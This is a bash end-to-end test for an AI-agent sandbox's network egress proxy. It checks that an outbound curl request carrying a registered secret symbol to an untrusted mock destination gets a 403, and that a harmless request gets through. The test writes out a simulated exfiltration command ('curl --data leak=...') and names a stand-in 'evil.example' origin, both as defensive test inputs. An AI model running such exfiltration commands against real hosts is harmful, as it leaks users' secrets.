#!/usr/bin/env bash
#
# FROZEN (protection-modes.md §10.7): the integrity form of
# launcher/test/net-proxy-live.test.sh, moved here verbatim on 2026-09-29 (only the
# relative paths changed). The default lane runs that file's `secrets` form.
# Runs only with MANDU_EXPERIMENTAL_INTEGRITY=1 (its tests/suites.mjs entry,
# tier frozen); it still picks its ports with free_port (the §8.4 race).
#
# net-proxy-live.test.sh — LIVE e2e oracle: the Mandu NETWORK egress gate is a
# real, unprivileged chokepoint wired through `mandu-run.sh --net-proxy`.
#
# Proves the network exfiltration kill-switch END-TO-END through the launcher: the
# launcher autostarts the cooperative forward proxy (interceptors/net-proxy),
# points the agent's HTTP_PROXY at it, and an outbound request carrying an
# UNTRUSTED $MDU:* symbol bound for an untrusted destination is BLOCKED
# (HTTP 403, fail-closed) so the secret never reaches the destination — while a
# benign, symbol-free request passes through and DOES reach the destination.
#
# Why this matters: it demonstrates the OS-level network egress data-usage gate
# holding with NO MITM/CA (the agent reaches the proxy via the standard
# HTTP_PROXY env) and NO agent cooperation — a symbol cannot be exfiltrated to an
# untrusted sink even off the model path.
#
# Offline + unprivileged: a real arbiter daemon on a temp socket + isolated symbol
# DB / event dir; a mock "untrusted destination" HTTP server that records what it
# received; the launcher autostarts the net-proxy on a free port and reaps it
# on exit. Everything under a temp dir, reaped (group-kill the arbiter) on exit.
#
# SKIPs cleanly (exit 0) when curl / node / npm are unavailable, or the arbiter /
# net-proxy deps are not installed — those are environment gaps, not failures.
#
# Run:  MANDU_EXPERIMENTAL_INTEGRITY=1 bash launcher/test/integrity/net-proxy-live.test.sh
#
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAUNCHER="$HERE/../../mandu-run.sh"
# mandu-run.sh now shims the TS launcher, which turns ON every rung by default.
# This oracle tests ONLY the net-proxy egress gate, so isolate it: disable the
# other rungs via env (fs-sync's worktree, the kernel confines, the exec-wrap that
# would block the symbol-bearing curl before it reaches the proxy, the model proxy,
# the reply filter) so the 403 is attributable to net-proxy alone.
export MANDU_FS_SYNC=0 MANDU_NO_KERNEL=1 MANDU_NO_CONTEXT_PROXY=1 MANDU_EXEC_WRAP=0 MANDU_REPLY_FILTER=0
# The rung banners this oracle greps print only under --verbose since the
# one-line default display (launch-banner.ts, release checklist a6).
export MANDU_VERBOSE=1
# This suite STATES its axes (docs/design/architecture/protection-modes.md §4): the arbiter it
# spawns and the launcher it runs both read these, so a change of the built-in
# default can never quietly change what the suite proves. STRICT makes an
# unstated axis a startup error in the arbiter.
export MANDU_AXES_STRICT=1 MANDU_INTEGRITY=1 MANDU_CONFIDENTIALITY=0
REPO_ROOT="$(cd "$HERE/../../.." && pwd)"
ARBITER_DIR="$REPO_ROOT/arbiter"
ARBITER_MAIN="$ARBITER_DIR/ipc/server-main.ts"
ARBITER_TSX="$ARBITER_DIR/node_modules/.bin/tsx"
EGRESS_DIR="$REPO_ROOT/interceptors/net-proxy"

PASS=0
FAIL=0
pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

skip() {
  echo "SKIP: $1"
  echo "─────────────────────────────────────────"
  echo "net-proxy-live.test.sh: 0 passed, 0 failed (skipped)"
  exit 0
}

# ── 0. environment gates (skip, not fail, on a missing toolchain) ─────────────
command -v curl >/dev/null 2>&1 || skip "curl not on PATH — cannot drive the proxy"
command -v node >/dev/null 2>&1 || skip "node not on PATH — cannot run the mock destination / arbiter client"
command -v npm  >/dev/null 2>&1 || skip "npm not on PATH — the launcher cannot autostart the net-proxy"
[[ -x "$ARBITER_TSX" ]] || skip "arbiter tsx not installed ($ARBITER_TSX) — run 'cd arbiter && npm install'"
[[ -f "$EGRESS_DIR/package.json" && -d "$EGRESS_DIR/node_modules" ]] \
  || skip "net-proxy deps not installed ($EGRESS_DIR) — run 'cd interceptors/net-proxy && npm install'"

# ── 1. scratch dirs + a real arbiter daemon on a temp socket ───────────────────
WORK="$(mktemp -d "${TMPDIR:-/tmp}/mandu-netegress-live.XXXXXX")" || skip "mktemp failed"
# The Mandu home: a temp one under $WORK with no config.toml, so no host
# ~/.mandu/config.toml is read (the 7cdfc2c e2e rule) and nothing lands in the
# real home; the arbiter and every launch below inherit it.
export MANDU_HOME="$WORK/mandu-home"
ARBITER_SOCK="$WORK/arbiter.sock"

# The mock UNTRUSTED destination binds to an ALTERNATE loopback IP (127.0.0.2), NOT
# 127.0.0.1. This is deliberate and CRITICAL: the launcher's NO_PROXY excludes
# `127.0.0.1,localhost,::1` (so the anthropic-proxy/U-LLM loopback channels are NOT
# routed through the egress proxy). A destination ON 127.0.0.1 would therefore be
# bypassed by curl and never hit the gate. 127.0.0.2 is still loopback (reachable,
# no privilege) but is NOT in NO_PROXY, so curl routes it THROUGH the egress proxy
# — exercising the gate exactly as a real remote untrusted destination would.
DEST_HOST="127.0.0.2"
# Since 2026-10-05 the net-proxy relays nothing to this machine (127.0.0.2
# included: net-proxy blocked-destinations.ts): the agent names the
# destination $DEST_NAME, which a mock-sites host route sends to the listener.
DEST_NAME="dest.mandu.test"

# Pick a free TCP port (bind :0 on the dest/proxy host, read it back, release).
free_port() {
  node -e 'const s=require("net").createServer();s.listen(0,process.argv[1],()=>{process.stdout.write(String(s.address().port));s.close();});' "$1"
}

# Confirm we can actually bind the alternate loopback (some minimal namespaces only
# expose 127.0.0.1) — SKIP cleanly if not, rather than fail.
MOCKPORT="$(free_port "$DEST_HOST" 2>/dev/null)"   # the mock untrusted destination port
[[ -n "$MOCKPORT" ]] || skip "cannot bind $DEST_HOST (alternate loopback unavailable) — cannot place a non-NO_PROXY destination"
ROUTES="$WORK/routes.yaml"
printf 'hosts:\n  - host: "%s"\n    to: "%s:%s"\n' "$DEST_NAME" "$DEST_HOST" "$MOCKPORT" > "$ROUTES"
EPORT="$(free_port 127.0.0.1)"      # the net-proxy listen port the launcher autostarts on
[[ -n "$EPORT" ]] || skip "could not allocate a free port for the net-proxy"

arbiter_pid=""
mock_pid=""
cleanup() {
  if [[ -n "$mock_pid" ]]; then kill "$mock_pid" 2>/dev/null || true; fi
  # Group-kill the arbiter (tsx -> node child) if we started one.
  if [[ -n "$arbiter_pid" ]]; then
    kill -- "-$arbiter_pid" 2>/dev/null || kill "$arbiter_pid" 2>/dev/null || true
  fi
  rm -rf "$WORK" 2>/dev/null || true
}
trap cleanup EXIT
# Lifeline backstop (lib/lifeline.sh): reaps the arbiter if this shell dies
# without its trap (SIGKILL / abandoned hang).
source "$(dirname "${BASH_SOURCE[0]}")/../lib/lifeline.sh"
mdu_lifeline_init "$WORK"

echo "[1/?] booting the arbiter daemon on $ARBITER_SOCK ..."
# setsid → own process group so cleanup can group-kill the whole tsx->node tree.
setsid env MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
           MANDU_HOME="$MANDU_HOME" \
           MANDU_LIFELINE=stdin \
  "$ARBITER_TSX" "$ARBITER_MAIN" "$ARBITER_SOCK" <"$MANDU_LIFELINE_FIFO" 9>&- >"$WORK/arbiter.log" 2>&1 &
arbiter_pid=$!

tries=200
while (( tries-- > 0 )); do
  [[ -S "$ARBITER_SOCK" ]] && break
  kill -0 "$arbiter_pid" 2>/dev/null || { echo "arbiter exited early; log:" >&2; cat "$WORK/arbiter.log" >&2; skip "arbiter daemon failed to start"; }
  sleep 0.1
done
[[ -S "$ARBITER_SOCK" ]] || { cat "$WORK/arbiter.log" >&2; skip "arbiter socket never appeared"; }
echo "      arbiter up (pid $arbiter_pid)."

# ── 1b. REGISTER a real untrusted symbol in the arbiter ────────────────────────
# The live arbiter's data-usage policy ALLOWS an UNKNOWN symbol (nothing in the
# table to leak → resolution is a no-op). To exercise a real BLOCK we must send a
# symbol the arbiter KNOWS as active+untrusted. So we allocate one via the arbiter's
# `symbolize` op (a small NDJSON-over-unix-socket client) and use the returned
# $MDU:* name as the exfil payload. The proxy then asks the arbiter's gate,
# which denies (untrusted symbol → untrusted destination) → 403.
echo "[1b/?] registering an untrusted symbol via the arbiter (symbolize) ..."
SECRET="TOPSECRET_$$_$RANDOM"
SYMBOL="$(node -e '
  const net = require("net");
  const sock = process.argv[1];
  const secret = process.argv[2];
  const c = net.connect(sock, () => {
    c.write(JSON.stringify({ id: 1, op: "symbolize", tool: "web_fetch", value: secret, origin: "https://evil.example" }) + "\n");
  });
  let buf = "";
  c.setEncoding("utf8");
  c.on("data", (d) => {
    buf += d;
    const nl = buf.indexOf("\n");
    if (nl < 0) return;
    const resp = JSON.parse(buf.slice(0, nl));
    c.end();
    if (resp && resp.ok && resp.result && resp.result.symbol) {
      process.stdout.write(resp.result.symbol);
      process.exit(0);
    }
    process.stderr.write("symbolize failed: " + buf);
    process.exit(1);
  });
  c.on("error", (e) => { process.stderr.write(String(e)); process.exit(1); });
  setTimeout(() => { process.stderr.write("symbolize timed out"); process.exit(1); }, 5000);
' "$ARBITER_SOCK" "$SECRET" 2>"$WORK/symbolize.err")"
if [[ -z "$SYMBOL" || "$SYMBOL" != *'$MDU:'* ]]; then
  cat "$WORK/symbolize.err" >&2 || true
  skip "could not register a symbol via the arbiter (symbolize op) — got: '$SYMBOL'"
fi
echo "      registered symbol: $SYMBOL  (resolves to the secret, withheld from untrusted egress)"

# ── 2. a mock UNTRUSTED destination that records every request body ───────────
# Writes each received request body (one line per request) to $RECV. An EMPTY/
# missing file therefore proves the destination received NOTHING.
RECV="$WORK/received.txt"
: > "$RECV"
echo "[2/?] starting the mock untrusted destination on $DEST_HOST:$MOCKPORT ..."
node -e '
  const http = require("http");
  const fs = require("fs");
  const host = process.argv[1];
  const port = Number(process.argv[2]);
  const recv = process.argv[3];
  const srv = http.createServer((req, res) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      fs.appendFileSync(recv, Buffer.concat(chunks).toString("utf8") + "\n");
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("ok");
    });
  });
  srv.listen(port, host, () => { process.stderr.write("mock-dest ready\n"); });
' "$DEST_HOST" "$MOCKPORT" "$RECV" >"$WORK/mock.log" 2>&1 &
mock_pid=$!

# Wait for the mock destination to accept connections. The `( exec 3<>… )` connect
# is the subshell's ONLY/last command, so its exit status reflects the CONNECT (a
# trailing `exec 3>&-` would mask a refused connect as a false "open"); the FD is
# discarded with the subshell.
tries=100
while (( tries-- > 0 )); do
  ( exec 3<>"/dev/tcp/$DEST_HOST/$MOCKPORT" ) 2>/dev/null && break
  kill -0 "$mock_pid" 2>/dev/null || { cat "$WORK/mock.log" >&2; skip "mock destination failed to start"; }
  sleep 0.05
done
echo "      mock destination up (pid $mock_pid), recording to $RECV."

# ── 3. EXFIL attempt: a request carrying the untrusted symbol → MUST be BLOCKED ─
# The launcher autostarts the net-proxy on $EPORT and sets the agent's
# HTTP_PROXY to it; curl honors HTTP_PROXY for the $DEST_HOST destination (which is
# NOT in NO_PROXY), so the request reaches the gate. The gate denies (symbol →
# untrusted destination) → 403, and the request never reaches the mock destination.
echo "[3/?] EXFIL attempt through the launcher (expect curl 403, dest receives NOTHING) ..."
# CRITICAL quoting: pass the symbol to the AGENT via an env var (MANDU_TEST_SYM)
# and reference it SINGLE-QUOTED in the inner command so neither this test's shell
# nor the launcher re-expands the literal `$MDU:*` token. Only the agent's
# curl-running bash expands $MANDU_TEST_SYM, putting the real symbol on the wire.
#
# We send the BARE registered symbol (no `.x` field suffix): the live arbiter's
# data-usage gate denies a symbol it KNOWS as active+untrusted to an untrusted
# destination → 403. A `$MDU:…[id].field` token would NOT match the
# registered base symbol → the arbiter would treat it as UNKNOWN and ALLOW it
# (nothing in the table to leak) — so for a deterministic BLOCK we use the exact
# symbol the arbiter handed back from `symbolize`.
exfil_out="$(
  MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
  MANDU_NO_ARBITER_AUTOSTART=1 \
  MANDU_NET_PROXY_PORT="$EPORT" \
  MANDU_NET_PROXY_MOCK_SITES="$ROUTES" \
  MANDU_TEST_SYM="$SYMBOL" \
  bash "$LAUNCHER" --target claude --net-proxy --no-scope --no-mcp -- \
    bash -c 'curl -s -o /dev/null -w "%{http_code}" --data "leak=${MANDU_TEST_SYM}" http://'"${DEST_NAME}"'/' \
    2>"$WORK/exfil.err"
)"
exfil_rc=$?

if ! grep -q "net-proxy LIVE" "$WORK/exfil.err"; then
  echo "--- launcher stderr (exfil) ---" >&2; cat "$WORK/exfil.err" >&2
fi
if grep -q "proceeding WITHOUT the network egress gate" "$WORK/exfil.err"; then
  echo "--- launcher stderr (degraded) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "launcher degraded out of --net-proxy — the network gate was NOT wired (see stderr above)"
fi

echo "      curl http_code: '$exfil_out' (launcher rc=$exfil_rc)"
if [[ "$exfil_out" == "403" ]]; then
  pass "EXFIL request carrying an untrusted symbol → curl saw 403 (the egress gate BLOCKED it)"
else
  fail "EXFIL request was NOT blocked; expected curl '403', got '$exfil_out'"
fi

# The destination must have received NOTHING for the exfil attempt.
recv_after_exfil="$(cat "$RECV" 2>/dev/null)"
if [[ -z "$recv_after_exfil" ]]; then
  pass "the untrusted destination received NOTHING (the secret never left the proxy)"
else
  fail "the destination RECEIVED data on the blocked exfil: $recv_after_exfil"
fi
# And the raw secret must not have leaked anywhere the destination could see.
if [[ "$recv_after_exfil" == *"$SECRET"* ]]; then
  fail "the raw secret LEAKED to the destination: $recv_after_exfil"
fi

# ── 4. BENIGN request: no symbol → MUST PASS and reach the destination ─────────
echo "[4/?] BENIGN request through the launcher (expect curl 200, dest receives hello=world) ..."
: > "$RECV"   # reset the recorder
benign_out="$(
  MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
  MANDU_NO_ARBITER_AUTOSTART=1 \
  MANDU_NET_PROXY_PORT="$EPORT" \
  MANDU_NET_PROXY_MOCK_SITES="$ROUTES" \
  bash "$LAUNCHER" --target claude --net-proxy --no-scope --no-mcp -- \
    bash -c "curl -s -o /dev/null -w '%{http_code}' --data 'hello=world' http://${DEST_NAME}/" \
    2>"$WORK/benign.err"
)"
benign_rc=$?
echo "      curl http_code: '$benign_out' (launcher rc=$benign_rc)"
if [[ "$benign_out" == "200" ]]; then
  pass "BENIGN symbol-free request → curl saw 200 (passed through the gate)"
else
  echo "--- launcher stderr (benign) ---" >&2; cat "$WORK/benign.err" >&2
  fail "BENIGN request did NOT pass; expected curl '200', got '$benign_out'"
fi

recv_after_benign="$(cat "$RECV" 2>/dev/null)"
if [[ "$recv_after_benign" == *"hello=world"* ]]; then
  pass "the destination RECEIVED the benign body (hello=world) — passthrough works"
else
  fail "the destination did NOT receive the benign body; got: '$recv_after_benign'"
fi

# ── 5. (optional) the launcher autostarted AND reaped the net-proxy ─────────
echo "[5/?] checking the launcher autostarted the net-proxy and reaped it on exit ..."
# Plain-ASCII substring only (the launcher's "net-proxy LIVE …" banner uses an
# em-dash, which can be locale-fragile to grep) — the TS launcher's manager emits
# "net-proxy LIVE" on autostart (truth-in-labeling, services/manager.ts).
if grep -qF "net-proxy LIVE" "$WORK/exfil.err" "$WORK/benign.err" 2>/dev/null; then
  pass "the launcher logged autostarting the net-proxy (LIVE network egress gate)"
else
  echo "--- launcher stderr (exfil) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "the launcher did not log autostarting the net-proxy"
fi
# After both launcher invocations returned, the autostarted proxy should be gone
# (the launcher trap-reaps it). The port must no longer accept connections. The
# `( exec 3<>… )` connect is the subshell's only command, so a refused connect is
# the subshell's status (the FD is discarded with the subshell).
sleep 0.3
if ( exec 3<>"/dev/tcp/127.0.0.1/$EPORT" ) 2>/dev/null; then
  fail "the net-proxy is STILL listening on $EPORT after the launcher exited (not reaped)"
else
  pass "the net-proxy port $EPORT is closed after the launcher exited (autostarted proxy was reaped)"
fi

# ── summary ───────────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────"
echo "net-proxy-live.test.sh: $PASS passed, $FAIL failed"
if [[ "$FAIL" -gt 0 ]]; then
  exit 1
fi
exit 0
